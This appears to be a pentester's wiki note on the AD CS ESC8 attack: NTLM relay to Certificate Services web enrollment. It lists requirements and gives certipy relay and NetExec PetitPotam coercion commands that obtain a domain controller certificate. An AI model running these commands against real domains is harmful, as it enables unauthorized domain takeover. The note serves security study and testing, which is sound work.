---
tags:
  - security
aliases:
  - NTLM Relay to AD CS Web Enrollment
---
A [[Active Directory Certificate Services|ADCS]] [[Privilege Escalation]] attack.
Involves a [[NTLM Relay]] on a [[Active Directory Certificate Services|ADCS]] http enrollment endpoint. 
# Requirements
- A web service authentication endpoint:
	- A [[Active Directory Certificate Services|ADCS]] http enrollment endpoint with target `http://<ca_server>/certsrv`
	- The [[Certificate Enrollment Web Service|CES]] and [[Certificate Enrollment Policy Web Service|CEP]] active
- The web service allows [[New Technology LAN Manager|NTLM]] authentication
- The web service lacks [[New Technology LAN Manager|NTLM]] protections such as [[Extended Protection for Authentication|EPA]]
# Identificiation
With [[certipy]]:
- `Web Enrollment is enabled over HTTPS...`
# Attack
1. Set up a [[NTLM Relay]] tool like [[certipy]] `relay`
```
certipy-ad relay -target 'https://10.10.10.10' -template 'DomainController'
```
2. Coerce authentication using [[PetitPotam]]
```
nxc smb $DC -u $USER -p $PASSORD -m coerce_plus -o METHOD=PetitPotam LISTENER=10.10.2.2
```
2. Relay authentication to `https://<ca_server>/certsrv/certfnsh.asp`
3. Certipy requests certificate
4. Authenticate using that certificate